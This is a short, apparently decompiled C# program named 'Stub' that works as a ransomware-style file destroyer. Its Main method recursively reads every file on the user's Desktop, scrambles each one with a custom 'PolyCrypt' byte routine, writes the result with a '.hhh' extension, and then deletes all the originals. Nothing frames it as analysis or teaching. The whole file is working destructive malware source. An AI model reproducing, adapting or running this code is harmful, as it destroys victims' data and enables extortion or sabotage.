using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class Main
{
	public static byte[] PolyCrypt(ref byte[] Data, byte[] Key, uint ExtraRounds = 0u)
	{
		checked
		{
			Array.Resize(ref Data, Data.Length + 1);
			Data[Data.Length - 1] = Convert.ToByte(new Random().Next(1, 255));
			object obj = default(object);
			object obj2 = default(object);
			if (ForLoopControl.ForLoopInitObj(obj, (object)((Data.Length - 1) * (unchecked((long)ExtraRounds) + 1L)), (object)0, (object)(-1), ref obj2, ref obj))
			{
				unchecked
				{
					do
					{
						Data[Conversions.ToInteger(Operators.ModObject(obj, (object)Data.Length))] = (byte)(checked((byte)unchecked(checked(unchecked((int)Data[Conversions.ToInteger(Operators.ModObject(obj, (object)Data.Length))]) + unchecked((int)Data[Conversions.ToInteger(Operators.ModObject(Operators.AddObject(obj, (object)1), (object)Data.Length))])) % 256)) ^ Key[Conversions.ToInteger(Operators.ModObject(obj, (object)Key.Length))]);
					}
					while (ForLoopControl.ForNextCheckObj(obj, obj2, ref obj));
				}
			}
			return Data;
		}
	}

	[STAThread]
	public static void Main()
	{
		object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		File.Delete(Conversions.ToString(Operators.ConcatenateObject(folderPath, (object)"\\desktop.ini")));
		string[] files = Directory.GetFiles(Conversions.ToString(folderPath), "*.*", SearchOption.AllDirectories);
		foreach (string text in files)
		{
			byte[] bytes = Encoding.Unicode.GetBytes("0000");
			byte[] Data = File.ReadAllBytes(text);
			byte[] bytes2 = PolyCrypt(ref Data, bytes);
			File.WriteAllBytes(text + ".hhh", bytes2);
		}
		string[] files2 = Directory.GetFiles(Conversions.ToString(folderPath), "*.*", SearchOption.AllDirectories);
		foreach (string text2 in files2)
		{
			if (!text2.Contains(".hhh"))
			{
				File.Delete(text2);
			}
		}
	}
}
